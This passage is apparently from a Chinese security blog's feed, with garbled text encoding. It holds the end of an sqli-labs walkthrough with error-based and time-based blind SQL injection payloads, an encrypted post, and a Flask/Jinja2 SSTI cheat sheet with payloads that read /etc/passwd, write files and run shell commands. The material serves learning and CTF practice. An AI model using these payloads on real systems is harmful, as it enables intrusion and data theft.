0,1),0x7e,floor(rand(0)*2))x from information_schema.plugins group by x)a) and (&quot;ygyp&quot;&#x3D;&quot;ygyp</span><br></pre></td></tr></table></figure><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><p>æŠŠ<strong>less-12</strong>åŒå¼•å·æ”¹æˆå•å¼•å·</p><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>æŠŠ<strong>less-12</strong>ä¸­çš„æ‹¬å·å»æ‰</p><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>time-based blind:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; and (select 1 from (select(sleep(3-if(ord(mid((select flag from ctftraining.flag),1,1))&gt;102,0,3))))a) and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>time-based blind:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot;) and (select(sleep(3-if((ord(mid((select flag from ctftraining.flag),1,1)))&gt;100,0,3)))) and (&quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure><h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>ä»æŸ¥è¯¢è¯­å¥å˜æˆæ’å…¥è¯­å¥ï¼Œå¥½åƒè¿˜æ˜¯ä¸€æ ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&#39; and updatexml(1,concat(0x7e,(select flag from ctftraining.flag),0x7e),1) and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><p>user-agentå¤´æŠ¥é”™æ³¨å…¥ã€‚</p><h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p>refereræ³¨å…¥</p><h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><p>cookieæ³¨å…¥</p><h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;br&gt;æ—©å°±æƒ³åˆ·sqli_labsäº†ï¼Œè¿™å‡ å¤©æ­£å¥½æ²¡äº‹å¹²ï¼Œå­¦ä¹ ä¸€ä¸‹sqlæ³¨å…¥ï¼Œé¡ºä¾¿ç†Ÿæ‚‰ä¸€ä¸‹sqlmap&lt;br&gt;ç»ƒä¹ å¹³å°ï¼š&lt;a href=&quot;https://buuoj.cn/challenges#sqli-labs&quot;&gt;https://buuoj.cn/challenges#sqli-labs&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="sqlæ³¨å…¥" scheme="http://yoursite.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>ä¸€äº›ç¬”è®°</title>
    <link href="http://yoursite.com/2020/07/31/links/"/>
    <id>http://yoursite.com/2020/07/31/links/</id>
    <published>2020-07-31T05:25:44.103Z</published>
    <updated>2020-08-27T10:27:14.119Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="ä¸å¥½æ„æ€ï¼Œå¯†ç æ²¡å¯¹å“¦ï¼Œåœ¨æ£€æŸ¥æ£€æŸ¥å‘¢ï¼" data-whm="ä¸å¥½æ„æ€ï¼Œä¿¡æ¯æ— æ³•éªŒè¯ï¼">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">å—¨ï¼Œè¯·å‡†ç¡®æ— è¯¯åœ°è¾“å…¥å¯†ç æŸ¥çœ‹å“Ÿï¼</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="12e1027128429856076e290aa13788d33e4bd199cf6a03ba691b22ee55acc2b2">ac35f2c000104d088ee9b190cb55c736f330c7f9287743812be4a5c33d5d3cb5cb7a257ee208658dca04b55eb86e690957aa664a95c8a9a91aa058987fe8fab712698d6cf1133424f55889e5e201f56f205a81a4a4ee10652f3560e69342c146cb8d9a2aac37254cd7843dbd30bbc3648a498c2506f7e8de148c6ca8a36697b9f3abbe24fbed0526b71c497e9e684fd9f98795d463926c1d906b01c54ce0b6c8e2384403477c5594fb6b87497509f10db2c4bec776d7dd0db931f1c5153be5a49b13179cf53134b8fa27a52d10e2fb66de32e0f032db258565e685d05dbf1de88dea8a6d0ce9c7f3f1457092cf0c9802b7376df1f9a20739e98630d86c8842e3d0a550e549abe09cee4b28348ced314b5664fcd0449b781e2d9eb21cf5b56b88c7cb702bf8ce869050bab30d2ab0e38810b07130a2416d5330aeac9d886ff87adc02da0d01acbe3f7ff383bb9e9d0770315be9e0dcaf12218dbfdaa85a6f3385fe3faaa058496e7ec503c979b6566447e639942017271a2bc1a87d9c411b11b0d3d1d50f96f7b97b46f822ca5a7fdfaf82ede4b5a58b1592724d7ca0c37fdc6376b3714c99bdd9b42913a7f3e379677b700527934534c47f22e48543e0e49c1ca92ff5c8c5c8c8078dae66c418581bee1621b61f81c6125d8d2b99fd798ebfc8f670b7de25519a8b60d7c98c99120f762cd08f56c8808c340f8b982e8dacffdb601f43901a3270a0adf74c26a011b00b96b9413f18fb41e0b91c17a6a9ae385035276f3fb791091f3a59f81cab8f4e06b25f04bcd32df871f52ea7fecdcb7e20207d555b5494cf368af16c8b380d457968b1c980c9d57ba629e494cdf5fe5502dca474798dc6aba9a4645b5ccbe1c910f7e2196ae7f700706a0f1e76806646995af0939da9a7f9c342a8a1534d0f2c806db23e638da33f1810f6a73d907d97d0ff2b4a6bfb1291860cc435c309049d67ec024123e590af006443d74ae0ec4adbdcdfaf5c3abd3ce3f1cc3b384ad39a6286ae7537d3a49341d3557f076c2088edf73b0e434cbc9f2870802d263b76d3351b7d31201dd6f59e482b9a83236909b945d0eb4d6b1446ceb23273048c0b11fcb0dfc28938c56a6f9198f2caf1a89d66340c5007c950a50cc8846dc83a577ca4542b0a3c5f698739492532a051d2b9510c202a2a56ad71e76313e46bdb8cd6e1252c697ca2dfa4816f9705b2b29cd00aad5c9261735fbe903f3e7744362e969816d6760540a6b3406875de5f33f1de3e3aa44168c38da5e1dfe341bb5e9cef1b20fb507c3942692ca8b211b82646534966d81de21041f50f164cb95424c44b69245775268ff0e68b4f11fce619a57a690aa87be6c4eea1188e155c85aec6bf6f442190487e05fe2cc4f1179a1b5f455f5b6fccd1bbf748d51e5f1c48d088e2f234eeda806d9efe70ad006096a07a3e3b8c7fe25e73de5db1a7c675e915abadfcd1bf42967207af322af946cbde2602641372edab947da0393920b38956c40ffca2601fecee5279ac4a768c1ccab31e97a4dad5f80fa5d54e466ca2b93a50665990f0ab2ea3117605b90f82775762a95c26c9c5ef0d4ce1c753b77a8930bd73eaf89b8fa1d8aadf8626ca539493f0533c1618d85459fb2635a3a328c88b1b1006dac5477d3d20b91b775a148923a18273b30690ea64fb2bc65350ea3dde443da9cbe2dc3355d6a7adad0d0397900f93076d01cb469b05549d1a897f9f5336c7ca70364625b6f883a61a42853c1bca29b5887d442472aa17ee6c0e1c0b720e491f49d6dd3e02a82108e7f9eae6b920e7a91a73fe7ecbb779f8013e1eaeea45c5f4ed4a98d16780b776ad4288b2400b286850e659aef3c8c520e3a134d8f6cb3a9e5508c75ee30ca2d988a727a419ddb6fc379aab440f4da66e88f26e3514a6f9c8eeed951eb1641ef1ebe8e3da31b4bfd1e6554ee8a722fc447dbb7b0cb6ef50c2fb42bad5c69d919079cc4ad0768def9edcc19f0fd2b7fa4b6706596bfa174102127ac57f5810bea0c149db84292bc9927dd38ecc6c65d5256261fe8d7f46fa4906f81c0fb4fe93278188e9e5e60f7419e9385780628fc5cabeb8cc4076e43130ce0d5caf8618d02fc056f54d2c824a4b513a5321995f40ef11242ea632d96d4474e83536f7d5c48324e102ba43c5c5e86195f1567dec675b6295318088d33e6eca253b1801da237c1e60e70d52761b41b60ab0f431ae93726d166c191c1cdae5841c393d624f63cb2751218232872a37544655d09ae548da51a455ea466799bee27077051537952da1898ef65cb39bc1964d8d941dedbf038ee54cd2ed4b6884edd19aec85b8c7ab1ed669389a905d80191e7ba5c7acfe9e8d03c59fddcf3cddd98fb36f077e99a5dab3975d024050b5143ab5f43a22663e6ffe1d409ae0235e07329404a1ed0d780d789f0b9a158dbb7fc077b94c64d30e233678c45a522ee574b4a81131a58b5e8d746a6600b3af0450fee593b686a6cb2dbc4a69043f48de764264b8ade4bf39f8ca750c0828b12e31844678132a76859264ef63aaabda45755c846605e9f003ff1ffa1dbb4314e6cd3c9bca238820e1fdc7d122a62829af91284ffa896cfca9e66635ac93df3bf6d1be64a6be510a5ff358709fa93b13fb286a6ce8abade23997dc57cc576a5126646ef9a9cec0ecc67ebb1052ffdae05c77c5498474e018703d5c3766cc6c231be2b714cdf74dfe32e66f3f267784d77a17b31b13311fa9b384fa9699b56a428d640c9b6ce3493046fc2c20255eda0153287e1f39841b5349fef1dc043e31ef66a31e85193f890f1ae75c801c620c84e77c5136445cff0b299477ef383f63b05da9ae014828fa9aaf8d752685eeb6307bc81302548d7a78ad0e0cead4e088fdafa2ae879a112d93d61b996d6b962854b7fcf359da3d7889a189abadce51f196499bb3c966665b75da2d4da0ecb30b1fcb602f654b4fe6d87f23e6bb6f307006502bc42509e39d6f533ff294b87deca312e47e5d7653cbc791b90a6b580d36463c8846be850ef28197f8bc4b37238cdc3edda34ef21c8f07e99aea23bbc983204277bf8db89fbbb77ba9a974a07656066f16d41151a4968bec9cae59daf59be941c140604b2d815c3670f64cc8f422b4609e24ea2173b27921ff81db0c4eccebdfacd2e5b4f110fd1ec849b0de370b61cd94cdd48354afd3bf7f6fe595b03852b691bb11dc91c6f290f9cba6f2a9bc11186a8e1e47ffa10dc94e0006075a6c14d0d2ecb61ca28b58cb94896e61f8f785c33eee658739e211acef1dd9e403d07ee769b1d16354c17b6e1a45fe6f8abecd29cdf90a12759c0fb1ee258b09b3c6189b8b3f2caa833e40c087038c05a8389a3eed5104eaab677df9e0510c8504b9659794bbc4ae15ec9cd5c382057823c3cd95798d21698d2434b27eabc02289c7eff9d97e6ceb80010bb19544b1481613f9e29cd8129ad4f7d1bc8f0625d9a810f9d6ed5403e3d19da24f7863df0550ac9de376f6ada631e9018874590e1e57da221cac10dcab5a44bd94921bf5cb9639c65dd3f2fae38db87cd3ee84b8af9eb500d6caf7ef33c1e97e0b807101ac82e84b644c694a406c8efbf526e5572660275a159b8c006f4efd8551351a1b3b8b726cbacb7b07ed0efd145df1d5428425287cb42d102c5d9f7bdb98a36528cc2ed112b1bdca94385d154ea23de4a358709a92406e983e4776d8642c18c473ffd6b90cc33f3ac4f24f8cd6b0359d50edae6b883d7040249bc7fc5174b6bab1b49ef47110374913bd7e5a0fbc89a655719960fa2534625316f9591d0fad2fc2b4e8f1442543d94e557fd515ea82fbd3b39090df3ac58d3283621847fd397d2441b4a762ea5eb81a5b0df6c434b6e20e610e7855d084b29961b46987669ddbaccb5d652afb39dff59fc5e7211d2e1ca43337c7eaace6053e3baba1472cee6d567b40ff938b7746b094d4f48ca27e731f5205aa668008e4c021faaffc97ba2b1b7e1c9d635684f21531351da863783031e58d2316b05000251e37f9bfee053972bf4f7a59917d0eacecfa84dca0730442fbd22e583f0aefb4036fd607227f50e0e0a7a8620868f339af360fcda117b3b1e21068b81b5cd028680297899bc2d32baf8b8722e3f3cfa15e7cd02662c78c20d7dc2b2274a0faba742e4abf2974429fcbb8bf6f5c9caee6d6e495d54a0f2f3489d7ef9ab94f510c3c0e5b82dfa1b4b76b6725e6cd6166eb05194eaf112942c8da94c31986b04f88907e80da6a132260f89a192382c7c10b3aedd13ebc06476917b9cc42080ff471a7660ed3b2d571ef06ba1c0f8e2abef5b4f319f7d206e77794a8da4170b11df5e78bce0097d22cdedfa2747e75f5a0e3d3af49bff24c3c8d40a073a0f1d49ec431615eb71259b875d15879a0dcad8be96ffb37be00d9ea58b78e1a9428fbe1cb7710e21abaf7088a25112549079ec656023525e0b9e8561d7936fc2a80a8d746108a208f27b11115db8598fd0217b667aa9dd4b416d91d289fdff93bd0491c5aaeb0ed27f6a3228715130d84354997a798b0a69787036d74b8d2680ff8e67749632031f9b9259285768bec27a89cc8d3ac1b6f7b61b34ebc0d15aa9042b4f1d87e50c98a0f5ce3ff9eae0c37ffffb20841d8b14ead005eb3b31842cce93ec32d9d1ac8ba877d1c5f3e3da22589dde390d9c348771e45c9c00fbeaa782bf4040aa07019d23b8ba382e20e59180a0a3768e21e9472c27fce9f52c45e54ea8ee3ca9e00b17a30e884f3381d22593663797ab26945729f2bd657987e6c99a77c9c929962f4abd5c85c2b5a8af95cc5f7872771ad56d8112202eee4c44a2d280800761887587f03496a3bf19afafa08c73b9ca5cbf68786c0af43bd21748a9a4db933214dc0d923ee080485c89ba53e2bad5348b00d1e696b960c7093bdb38c41cf2bcf5106e208d9b31d1611e4e470cffe6fcf3fe5a8d43e1c2024b69f565c7ae15912c80ec1560680d18e29b3fbb51ecde28063bcd072a8ccb87f6ca80f510f2be9a25ab015c4c85c312f6989e07e6432984e8c883407cc96c3b751e3b0a83a0c7943b6cf5957b0a2ff1a173948853b71f221930d513cb5d2d362e132274700c1aa8f4fde8b159d8f9c89ab003ba267884195e06230710d01f028eca1ff9df1b1fbee9a8414bb00f20d2436d499be232c011bd8081f3a4860a6788eeff1ab11085b7c86a35d59ff108f4f48bd6bf69454bc9e0bec1e24132d1da8d1755323384c95e1ba9e02e11ee8a34c2e89ac4fb40d22a2982fb2c5e092b8037acb780b5bf7f45674ad055acaa35538a7c2eac3add55a995316ba37fbb651668ff8a7884d97dc6f828ad0399adbcf8895170fad4f745521ebd3c427794b7d8547cbbaaad96fdff9e61767f8380894f956dcd740832d9e8c2133b2fda048940e8a03b3aa7c744e948a1168cfb3178e7e8320019738561859d1312fa415abe2da5f360f96f5131250dbf7426deacff5cc15c28be2572d977d5cc6ca5222fb5f9e1169c63eed98fd545a4b42e5d3b124441dc41f303b9e0020f358e6afc07c79d0fcbe319660554564b7f05c0aa127b16cd6967b0510bd44e0b8243646b3c6d94ab374e0a85d4061a36a18911f9f5a09a9d6ff07e7827aa768f6bad40fe1f6d907819e1808f8489afa65e670d62a5b2c3eeebec89de097ed902148bd715a5076e63c5c474ac85e97fd74d112079de70199f14f1a2552328e4216e141bcf588bd3ea48d0964661096eb16d25cb24c80b1782a72b65ea1ca28753cc61f0495f423f674b56098f096fafd679de869869ccee4630cac4c6b6f88b1ed1514b287ca117f9a27acef554af0498d870dd12d387ee6b018771dbcbd054137a5e462d48da24979bd5f07b842c5d506fe343e9623360a33d2e177aa7c358cbb0dd2c5fcb733073bda5183d2d501b618d985b5f56c13e377dbb97b</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      å’¦ï¼Œè¿™æ˜¯ä¸€ç¯‡åŠ å¯†æ–‡ç« ï¼Œå¥½åƒéœ€è¦è¾“å…¥å¯†ç æ‰èƒ½æŸ¥çœ‹å‘¢ï¼
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Flask sstiæ¨¡æ¿æ³¨å…¥ä¸€äº›æ€»ç»“</title>
    <link href="http://yoursite.com/2020/07/25/ssti-1/"/>
    <id>http://yoursite.com/2020/07/25/ssti-1/</id>
    <published>2020-07-25T06:39:38.000Z</published>
    <updated>2020-09-16T05:11:36.836Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="sstiæ€è·¯"><a href="#sstiæ€è·¯" class="headerlink" title="sstiæ€è·¯"></a>sstiæ€è·¯</h1><p>æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥å’Œå¸¸è§Webæ³¨å…¥çš„æˆå› ä¸€æ ·ï¼Œä¹Ÿæ˜¯æœåŠ¡ç«¯æ¥æ”¶äº†ç”¨æˆ·çš„è¾“å…¥ï¼Œå°†å…¶ä½œä¸º Web åº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œ<a id="more"></a>åœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ’å…¥çš„æ¶æ„å†…å®¹ï¼Œå› è€Œå¯èƒ½å¯¼è‡´äº†æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShell ç­‰é—®é¢˜ã€‚å…¶å½±å“èŒƒå›´ä¸»è¦å–å†³äºæ¨¡ç‰ˆå¼•æ“çš„å¤æ‚æ€§ã€‚</p><p>sstiæ¨¡æ¿æ³¨å…¥çš„åŸºæœ¬æ€è·¯å°±æ˜¯é€šè¿‡<code>__class__</code>å±æ€§æ‰¾åˆ°åŸºç±»objectï¼Œé€šè¿‡<code>__subclasses__()</code>æŸ¥çœ‹objectä¸­æœ‰å“ªäº›ç±»å¯ä»¥ä½¿ç”¨ï¼Œä¸€èˆ¬éƒ½æ˜¯å»å¯»æ‰¾osç±»ï¼Œç„¶åé€šè¿‡<strong>blobals</strong>å…¨å±€æ¥æŸ¥æ‰¾æ‰€æœ‰çš„æ–¹æ³•åŠå˜é‡åŠå‚æ•°ï¼Œé€šå¸¸ç”¨åˆ°<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>ç±»çš„<code>popen</code>æ–¹æ³•ã€‚</p><h1 id="åŸºæœ¬æµç¨‹"><a href="#åŸºæœ¬æµç¨‹" class="headerlink" title="åŸºæœ¬æµç¨‹"></a>åŸºæœ¬æµç¨‹</h1><h2 id="é¦–å…ˆè·å–åŸºæœ¬ç±»"><a href="#é¦–å…ˆè·å–åŸºæœ¬ç±»" class="headerlink" title="é¦–å…ˆè·å–åŸºæœ¬ç±»"></a>é¦–å…ˆè·å–åŸºæœ¬ç±»</h2><p>é¦–å…ˆé€šè¿‡strã€dictã€tupleæˆ–listç­‰è·å–pythonçš„åŸºæœ¬ç±»</p><ul><li><strong>dict</strong>ï¼šä¿å­˜ç±»å®ä¾‹æˆ–å¯¹è±¡å®ä¾‹çš„å±æ€§å˜é‡é”®å€¼å¯¹å­—å…¸</li><li><strong>class</strong>ï¼šè¿”å›è°ƒç”¨çš„å‚æ•°ç±»å‹</li><li><strong>mro</strong>ï¼šè¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚</li><li><strong>bases</strong>ï¼šè¿”å›ç±»å‹åˆ—è¡¨</li><li><strong>subclasses</strong>ï¼šè¿”å›objectçš„å­ç±»</li><li><strong>init</strong>ï¼šç±»çš„åˆå§‹åŒ–æ–¹æ³•</li><li><strong>globals</strong>ï¼šå‡½æ•°ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡ ä¸ func_globals ç­‰ä»·</li></ul><p>ä¹Ÿå¯ä»¥ç”¨ä¸€äº›å…¶ä»–åœ¨jinja2ä¸­å­˜åœ¨çš„å¯¹è±¡ï¼Œæ¯”å¦‚<code>request</code>ã€‚åœ¨Pythonä¸­ï¼Œæ¯ä¸ªç±»éƒ½æœ‰ä¸€ä¸ª<strong>bases</strong>å±æ€§ï¼Œåˆ—å‡ºå…¶åŸºç±»ï¼Œè€Œ<strong>mro</strong>è¿”å›çš„æ—¶è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåºï¼Œåœ¨å…¶ä¸­é€‰æ‹©<strong>object</strong>ç±»å°±å¥½äº†ã€‚</p><ul><li><code>&#39;&#39;.__class__.__base__</code></li><li><code>&#39;&#39;.__class__.__mro__[1]</code></li><li><code>&quot;&quot;.__class__.__bases__[0]</code></li><li><code>().__class__.__bases__[0]</code></li><li><code>[].__class__.__bases__[0]</code></li><li><code>{}.__class__.__mro__[1]</code></li><li><code>request.__class__.__mro__[1]</code></li></ul><p>å¯ä»¥å€ŸåŠ©```<strong>getitem</strong>ç»•è¿‡ä¸­æ‹¬å·çš„é™åˆ¶ï¼š</p><ul><li><code>&#39;&#39;.__class__.__mro__.__getitem__(1)</code></li><li><code>{}.__class__.__bases__.__getitem__(0)</code></li><li><code>().__class__.__bases__.__getitem__(0)</code></li><li><code>request.__class__.__mro__.__getitem__(1)</code></li></ul><h2 id="å¯»æ‰¾æ–¹æ³•"><a href="#å¯»æ‰¾æ–¹æ³•" class="headerlink" title="å¯»æ‰¾æ–¹æ³•"></a>å¯»æ‰¾æ–¹æ³•</h2><p>è·å–åŸºæœ¬ç±»åï¼Œç»§ç»­å‘ä¸‹è·å–åŸºæœ¬ç±»<code>object</code>çš„å­ç±»ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°é‡è½½è¿‡çš„<strong>init</strong>ç±»ï¼ˆåœ¨è·å–åˆå§‹åŒ–å±æ€§åï¼Œå¸¦ wrapper çš„è¯´æ˜æ²¡æœ‰é‡è½½ï¼Œå¯»æ‰¾ä¸å¸¦ warpper çš„ï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__bases__[0].__subclasses__()[-1].__init__)</span><br><span class="line">print(&quot;&quot;.__class__.__bases__[0].__subclasses__()[1].__init__)</span><br><span class="line">è¾“å‡ºï¼š</span><br><span class="line">&lt;function BlueprintSetupState.__init__ at 0x038CE0C0&gt;</span><br><span class="line">&lt;slot wrapper &#39;__init__&#39; of &#39;weakref&#39; objects&gt;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å…¶å¼•ç”¨<strong>builtins</strong><br>Python ç¨‹åºä¸€æ—¦å¯åŠ¨ï¼Œå®ƒå°±ä¼šåœ¨ç¨‹åºå‘˜æ‰€å†™çš„ä»£ç æ²¡æœ‰è¿è¡Œä¹‹å‰å°±å·²ç»è¢«åŠ è½½åˆ°å†…å­˜ä¸­äº†,è€Œå¯¹äº builtins å´ä¸ç”¨å¯¼å…¥ï¼Œå®ƒåœ¨ä»»ä½•æ¨¡å—éƒ½ç›´æ¥å¯è§ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥è°ƒç”¨å¼•ç”¨çš„æ¨¡å—ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;]</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šè¿”å› dict ç±»å‹ï¼Œå¯»æ‰¾ keys ä¸­å¯ç”¨å‡½æ•°ï¼Œç›´æ¥è°ƒç”¨å³å¯ï¼Œä½¿ç”¨ keys ä¸­çš„ open ï¼ˆpython2ä¸­æ˜¯fileï¼‰ä»¥å®ç°è¯»å–æ–‡ä»¶çš„åŠŸèƒ½ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;D:\\test.txt&#39;).read()</span><br></pre></td></tr></table></figure><h2 id="è¯»å†™æ–‡ä»¶"><a href="#è¯»å†™æ–‡ä»¶" class="headerlink" title="è¯»å†™æ–‡ä»¶"></a>è¯»å†™æ–‡ä»¶</h2><p>åœ¨python2ä¸­ä½¿ç”¨fileè¯»å†™æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#è¯»æ–‡ä»¶ï¼š</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">#å†™æ–‡ä»¶ï¼š</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;tmp&#39;).write(&#39;test&#39;)</span><br></pre></td></tr></table></figure><p>åœ¨python3ä¸­fileæ²¡æœ‰äº†ï¼Œä½¿ç”¨openï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#è¯»æ–‡ä»¶ï¼š</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;D:\\test.txt&#39;).read()</span><br></pre></td></tr></table></figure><h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><h3 id="1-popen"><a href="#1-popen" class="headerlink" title="1.popen"></a>1.popen</h3><p>ä½¿ç”¨<code>popen</code>è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚<br>é¦–å…ˆè¦å…ˆæ‰¾åˆ°<code>os._wrap_close</code>ç±»ï¼Œ<br>æŸ¥çœ‹ os._wrap_close æ–¹æ³•çš„ä½ç½®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[1].__subclasses__().index(os._wrap_close)</span><br><span class="line">132</span><br></pre></td></tr></table></figure><p>è¿”å›äº†ä¸‹æ ‡ç´¢å¼•ï¼Œç›´æ¥è°ƒç”¨å®ƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><h3 id="2-eval"><a href="#2-eval" class="headerlink" title="2.eval"></a>2.eval</h3><p>ä½¿ç”¨<code>eval</code>è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;)</span><br></pre></td></tr></table></figure><h3 id="3-warnings-catch-warnings"><a href="#3-warnings-catch-warnings" class="headerlink" title="3.warnings.catch_warnings"></a>3.warnings.catch_warnings</h3><p>åˆ©ç”¨warnings.catch_warnings è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚<br>è¿™ä¸ªåœ¨python2å’Œpython3ä¸­æœ‰äº›ä¸åŒï¼Œå…ˆè¯´Python2çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;)</span><br></pre></td></tr></table></figure><p>ç„¶åæ˜¯Python3çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)</span><br></pre></td></tr></table></figure><p>æˆ–è€…ä¹Ÿå¯ä»¥è¿™æ ·å¤šè¡Œæ‰§è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h3 id="4-subprocess"><a href="#4-subprocess" class="headerlink" 